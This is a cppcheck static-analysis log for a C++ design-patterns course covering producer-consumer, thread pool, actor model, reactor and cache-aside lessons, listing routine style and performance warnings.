D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:330:10: style: inconclusive: Technically the member function 'SmartProducer::produceFibonacci' can be const. [functionConst]
    void produceFibonacci(QueueType& queue) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:361:10: performance: inconclusive: Technically the member function 'SmartProducer::isPrime' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool isPrime(int n) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:282:5: style: Class 'SmartProducer' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SmartProducer(Strategy strategy = Strategy::LINEAR, int count = 20, int minVal = 1, int maxVal = 100)
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:388:5: style: Class 'SmartConsumer' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SmartConsumer(Strategy strategy = Strategy::SIMPLE) : strategy_(strategy) {}
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:449:21: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
                sum += value;
                    ^
122/194 files checked 64% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_comparison.cpp ...
123/194 files checked 64% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:305:26: performance: Using std::move for returning object by-value from function will affect copy elision optimization. More: https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Rf-return-move-local [returnStdMoveLocal]
        return std::move(item);
                         ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:118:9: style: inconclusive: Member variable 'ProducerCpp20::startValue_' is in the wrong place in the initializer list. [initializerList]
    int startValue_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:129:39: note: Member variable 'ProducerCpp20::startValue_' is in the wrong place in the initializer list.
        : queue_(queue), name_(name), startValue_(startValue), count_(count), delay_(delay) {}
                                      ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:118:9: note: Member variable 'ProducerCpp20::startValue_' is in the wrong place in the initializer list.
    int startValue_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:158:31: style: inconclusive: Member variable 'ConsumerCpp20::delay_' is in the wrong place in the initializer list. [initializerList]
    std::chrono::milliseconds delay_;
                              ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:165:39: note: Member variable 'ConsumerCpp20::delay_' is in the wrong place in the initializer list.
        : queue_(queue), name_(name), delay_(delay) {}
                                      ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:158:31: note: Member variable 'ConsumerCpp20::delay_' is in the wrong place in the initializer list.
    std::chrono::milliseconds delay_;
                              ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:188:9: performance: inconclusive: Technically the member function 'ConsumerCpp20::processItem' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    int processItem(int item) {
        ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:592:10: performance: inconclusive: Technically the member function 'SmartProducerCpp23::isPrime' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    bool isPrime(int n) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:124:5: style: Class 'ProducerCpp20' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    ProducerCpp20(ProducerConsumerQueueCpp20<int>& queue,
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:162:5: style: Class 'ConsumerCpp20' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    ConsumerCpp20(ProducerConsumerQueueCpp20<int>& queue,
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:432:5: style: Class 'SmartProducerCpp23' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SmartProducerCpp23(Strategy strategy = Strategy::LINEAR, int count = 20, int minVal = 1, int maxVal = 100)
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:619:5: style: Class 'SmartConsumerCpp23' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SmartConsumerCpp23(Strategy strategy = Strategy::SIMPLE) : strategy_(strategy) {}
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:713:21: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
                sum += value;
                    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:223:9: style: struct member 'DataMessage::id' is never used. [unusedStructMember]
    int id;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:224:17: style: struct member 'DataMessage::content' is never used. [unusedStructMember]
    std::string content;
                ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:229:46: style: struct member 'ControlMessage::type' is never used. [unusedStructMember]
    enum Type { START, STOP, PAUSE, RESUME } type;
                                             ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:230:17: style: struct member 'ControlMessage::reason' is never used. [unusedStructMember]
    std::string reason;
                ^
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp: __cpp_lib_expected...
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp: __cpp_lib_flat_map...
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp: __cpp_lib_generator...
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp: __cpp_lib_print...
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp: __cpp_lib_stacktrace...
124/194 files checked 65% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_quick_comparison.cpp ...
125/194 files checked 66% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:131:9: style: inconclusive: Member variable 'DataProducer::startValue_' is in the wrong place in the initializer list. [initializerList]
    int startValue_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:142:39: note: Member variable 'DataProducer::startValue_' is in the wrong place in the initializer list.
        : queue_(queue), name_(name), startValue_(startValue), count_(count), delay_(delay) {}
                                      ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:131:9: note: Member variable 'DataProducer::startValue_' is in the wrong place in the initializer list.
    int startValue_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:181:31: style: inconclusive: Member variable 'DataConsumer::delay_' is in the wrong place in the initializer list. [initializerList]
    std::chrono::milliseconds delay_;
                              ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:188:39: note: Member variable 'DataConsumer::delay_' is in the wrong place in the initializer list.
        : queue_(queue), name_(name), delay_(delay) {}
                                      ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:181:31: note: Member variable 'DataConsumer::delay_' is in the wrong place in the initializer list.
    std::chrono::milliseconds delay_;
                              ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:217:9: performance: inconclusive: Technically the member function 'DataConsumer::processItem' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    int processItem(int item) {
        ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:137:5: style: Class 'DataProducer' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    DataProducer(ProducerConsumerQueue<int>& queue,
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:185:5: style: Class 'DataConsumer' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    DataConsumer(ProducerConsumerQueue<int>& queue,
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:272:5: style: Class 'StatisticsConsumer' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    StatisticsConsumer(ProducerConsumerQueue<int>& queue) : queue_(queue) {}
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_pattern.cpp:302:17: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
            sum += value;
                ^
126/194 files checked 66% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_vulnerabilities.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_vulnerabilities.cpp:89:5: warning: Member variable 'VulnerableRingBuffer < int , 10 >::buffer_' is not initialized. [uninitMemberVarPrivate]
    T buffer_[N];
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_vulnerabilities.cpp:235:5: style: Struct 'Message' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Message(int i) : id(i) {
    ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_vulnerabilities.cpp:281:22: style: Variable 'msg' can be declared as pointer to const [constVariablePointer]
            Message* msg = queue.pop();
                     ^
127/194 files checked 67% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\secure_producer_consumer_alternatives.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\secure_producer_consumer_alternatives.cpp:128:1: style: The class 'LockFreeRingBuffer < int , 32 >' does not declare a constructor although it has private member variables which likely require initialization. [noConstructor]
class LockFreeRingBuffer {
^
128/194 files checked 68% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp:40:5: style: Struct 'Task' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Task(std::function<void()> func, TaskPriority prio = TaskPriority::NORMAL)
    ^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp:265:17: style: Condition 'has_task' is always true [knownConditionTrueFalse]
            if (has_task) {
                ^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp:256:17: note: Assuming that condition '!has_task' is not redundant
            if (!has_task) {
                ^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp:265:17: note: Condition 'has_task' is always true
            if (has_task) {
                ^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp:130:16: style: The scope of the variable 'thread_id' can be reduced. [variableScope]
        size_t thread_id = next_thread_.fetch_add(1) % workers_.size();
               ^
129/194 files checked 68% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\exploits\thread_pool_exploits.cpp ...
130/194 files checked 69% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\secure_thread_pool_alternatives.cpp ...
131/194 files checked 69% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_cpp23_comparison.cpp ...
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_cpp23_comparison.cpp: __cpp_lib_expected...
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_cpp23_comparison.cpp: __cpp_lib_generator...
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_cpp23_comparison.cpp: __cpp_lib_jthread...
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_cpp23_comparison.cpp: __cpp_lib_print...
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_cpp23_comparison.cpp: __cpp_lib_stacktrace...
132/194 files checked 70% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_pattern.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_pattern.cpp:173:30: style: inconclusive: Member variable 'AdvancedThreadPool::workerStats_' is in the wrong place in the initializer list. [initializerList]
    std::vector<WorkerStats> workerStats_;
                             ^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_pattern.cpp:187:50: note: Member variable 'AdvancedThreadPool::workerStats_' is in the wrong place in the initializer list.
        : stop_(false), numThreads_(numThreads), workerStats_(numThreads) {
                                                 ^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_pattern.cpp:173:30: note: Member variable 'AdvancedThreadPool::workerStats_' is in the wrong place in the initializer list.
    std::vector<WorkerStats> workerStats_;
                             ^
133/194 files checked 71% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_vulnerabilities.cpp ...
134/194 files checked 71% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp:88:21: warning: Identical inner 'if' condition is always true. [identicalInnerCondition]
                if (!mailbox_.empty()) {
                    ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp:86:20: note: outer condition: !mailbox_.empty()
            while (!mailbox_.empty()) {
                   ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp:88:21: note: identical inner condition: !mailbox_.empty()
                if (!mailbox_.empty()) {
                    ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp:20:22: style: struct member 'Message::id' is never used. [unusedStructMember]
struct Message { int id; std::string data; };
                     ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp:20:38: style: struct member 'Message::data' is never used. [unusedStructMember]
struct Message { int id; std::string data; };
                                     ^
135/194 files checked 71% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:278:10: style: inconclusive: Technically the member function 'CalculatorActor::handleGetResult' can be const. [functionConst]
    void handleGetResult(const Message& message) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:287:10: style: inconclusive: Technically the member function 'CalculatorActor::handleStatus' can be const. [functionConst]
    void handleStatus(const Message& message) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:395:10: style: inconclusive: Technically the member function 'UserManagerActor::handleListUsers' can be const. [functionConst]
    void handleListUsers(const Message& message) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:403:10: style: inconclusive: Technically the member function 'UserManagerActor::handleUserCount' can be const. [functionConst]
    void handleUserCount(const Message& message) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:429:10: style: inconclusive: Technically the member function 'CoordinatorActor::handleAddActor' can be const. [functionConst]
    void handleAddActor(const Message& message) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:108:10: style: Virtual function 'stop' is called from destructor '~BaseActor()' at line 88. Dynamic binding is not used. [virtualCallInConstructor]
    void stop() override {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:88:9: note: Calling stop
        stop();
        ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:108:10: note: stop is a virtual function
    void stop() override {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:87:14: style: The destructor '~BaseActor' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    virtual ~BaseActor() {
             ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:55:14: note: Virtual destructor in base class
    virtual ~Actor() = default;
             ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:87:14: note: Destructor in derived class
    virtual ~BaseActor() {
             ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:566:22: style: Variable 'calculator' can be declared as reference to const [constVariableReference]
    CalculatorActor& calculator = system.createActor<CalculatorActor>("Calculator");
                     ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:591:23: style: Variable 'userManager' can be declared as reference to const [constVariableReference]
    UserManagerActor& userManager = system.createActor<UserManagerActor>("UserManager");
                      ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:666:22: style: Variable 'calculator' can be declared as reference to const [constVariableReference]
    CalculatorActor& calculator = system.createActor<CalculatorActor>("Calculator");
                     ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:457:20: style: Variable 'actor' can be declared as pointer to const [constVariablePointer]
        for (auto* actor : managedActors_) {
                   ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:542:19: style: Variable 'baseActor' can be declared as pointer to const [constVariablePointer]
            auto* baseActor = dynamic_cast<BaseActor*>(pair.second.get());
                  ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:566:33: style: Variable 'calculator' is assigned a value that is never used. [unreadVariable]
    CalculatorActor& calculator = system.createActor<CalculatorActor>("Calculator");
                                ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:591:35: style: Variable 'userManager' is assigned a value that is never used. [unreadVariable]
    UserManagerActor& userManager = system.createActor<UserManagerActor>("UserManager");
                                  ^
136/194 files checked 73% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_vulnerabilities.cpp ...
137/194 files checked 73% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\exploits\actor_model_exploits.cpp ...
138/194 files checked 73% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:223:10: style: inconclusive: Technically the member function 'PingPongActor::handlePing' can be const. [functionConst]
    void handlePing(std::shared_ptr<PingMessage> ping) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:333:5: style: Class 'SupervisorActor' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SupervisorActor(const std::string& name) : Actor(name) {
    ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:344:6: style: The destructor '~SupervisorActor' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~SupervisorActor() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:112:14: note: Virtual destructor in base class
    virtual ~Actor() {
             ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:344:6: note: Destructor in derived class
    ~SupervisorActor() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:297:25: style: Variable 'result' is assigned a value that is never used. [unreadVariable]
            std::string result = "?>?'' ?+?+?' ? " + std::to_string(work->work_id);
                        ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:364:31: style: Variable 'work_message' is assigned a value that is never used. [unreadVariable]
            auto work_message = std::make_shared<WorkMessage>(task_id, data);
                              ^
139/194 files checked 74% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\secure_actor_model_alternatives.cpp ...
140/194 files checked 74% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\event_loop.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\event_loop.cpp:302:9: style: inconclusive: Member variable 'TCPServer::server_fd_' is in the wrong place in the initializer list. [initializerList]
    int server_fd_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\event_loop.cpp:308:76: note: Member variable 'TCPServer::server_fd_' is in the wrong place in the initializer list.
    TCPServer(int port, EventLoop& loop) : port_(port), event_loop_(loop), server_fd_(-1) {}
                                                                           ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\event_loop.cpp:302:9: note: Member variable 'TCPServer::server_fd_' is in the wrong place in the initializer list.
    int server_fd_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\event_loop.cpp:328:30: warning: Potentially invalid type conversion in old-style C cast, clarify/fix with C++ cast [dangerousTypeCast]
        if (bind(server_fd_, (struct sockaddr*)&address, sizeof(address)) < 0) {
                             ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\event_loop.cpp:370:44: warning: Potentially invalid type conversion in old-style C cast, clarify/fix with C++ cast [dangerousTypeCast]
        int client_fd = accept(server_fd_, (struct sockaddr*)&client_address, &client_len);
                                           ^
141/194 files checked 75% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\exploits\reactor_exploits.cpp ...
142/194 files checked 75% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp:202:17: style: The scope of the variable 'fd' can be reduced. [variableScope]
            int fd = pair.first;
                ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp:256:9: style: struct member 'ReactorEvent::fd' is never used. [unusedStructMember]
    int fd;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp:257:22: style: struct member 'ReactorEvent::type' is never used. [unusedStructMember]
    ReactorEventType type;
                     ^
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp: __cpp_lib_expected...
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp: __cpp_lib_flat_map...
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp: __cpp_lib_generator...
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp: __cpp_lib_generator;__cpp_lib_stacktrace...
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp: __cpp_lib_print...
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp: __cpp_lib_stacktrace...
143/194 files checked 76% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp ...
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:232:9: style: inconclusive: Member variable 'TCPServerHandler::server_fd_' is in the wrong place in the initializer list. [initializerList]
    int server_fd_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:239:43: note: Member variable 'TCPServerHandler::server_fd_' is in the wrong place in the initializer list.
        : port_(port), reactor_(reactor), server_fd_(-1) {}
                                          ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:232:9: note: Member variable 'TCPServerHandler::server_fd_' is in the wrong place in the initializer list.
    int server_fd_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:426:14: style: inconclusive: Member variable 'TimerHandler::reactor_' is in the wrong place in the initializer list. [initializerList]
    Reactor& reactor_;
             ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:435:64: note: Member variable 'TimerHandler::reactor_' is in the wrong place in the initializer list.
        : interval_(interval), callback_(std::move(callback)), reactor_(reactor), timer_fd_(-1) {}
                                                               ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:426:14: note: Member variable 'TimerHandler::reactor_' is in the wrong place in the initializer list.
    Reactor& reactor_;
             ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:425:9: style: inconclusive: Member variable 'TimerHandler::timer_fd_' is in the wrong place in the initializer list. [initializerList]
    int timer_fd_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:435:83: note: Member variable 'TimerHandler::timer_fd_' is in the wrong place in the initializer list.
        : interval_(interval), callback_(std::move(callback)), reactor_(reactor), timer_fd_(-1) {}
                                                                                  ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:425:9: note: Member variable 'TimerHandler::timer_fd_' is in the wrong place in the initializer list.
    int timer_fd_;
        ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:241:6: style: The destructor '~TCPServerHandler' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~TCPServerHandler() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:42:14: note: Virtual destructor in base class
    virtual ~EventHandler() = default;
             ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:241:6: note: Destructor in derived class
    ~TCPServerHandler() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:339:6: style: The destructor '~TCPClientHandler' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~TCPClientHandler() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:42:14: note: Virtual destructor in base class
    virtual ~EventHandler() = default;
             ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:339:6: note: Destructor in derived class
    ~TCPClientHandler() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:437:6: style: The destructor '~TimerHandler' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~TimerHandler() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:42:14: note: Virtual destructor in base class
    virtual ~EventHandler() = default;
             ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:437:6: note: Destructor in derived class
    ~TimerHandler() {
     ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:261:30: warning: Potentially invalid type conversion in old-style C cast, clarify/fix with C++ cast [dangerousTypeCast]
        if (bind(server_fd_, (struct sockaddr*)&address, sizeof(address)) < 0) {
                             ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:309:44: warning: Potentially invalid type conversion in old-style C cast, clarify/fix with C++ cast [dangerousTypeCast]
        int client_fd = accept(server_fd_, (struct sockaddr*)&client_address, &client_len);
                                           ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_pattern.cpp:204:17: style: The scope of the variable 'fd' can be reduced. [variableScope]
            int fd = pair.first;
                ^
144/194 files checked 77% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_vulnerabilities.cpp ...
145/194 files checked 78% done
Checking D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\secure_reactor_alternatives.cpp ...
146/194 files checked 78% done
Checking D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_cpp23_comparison.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_cpp23_comparison.cpp:20:38: performance: inconclusive: Technically the member function 'Database::query' can be static (but you may consider moving to unnamed namespace). [functionStatic]
class Database { public: std::string query(const std::string& key) { return "value_" + key; } };
                                     ^
147/194 files checked 78% done
Checking D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp ...
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:426:9: performance: Variable 'cache_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        cache_ = std::make_unique<LRUCache<Key, Value>>(capacity);
        ^
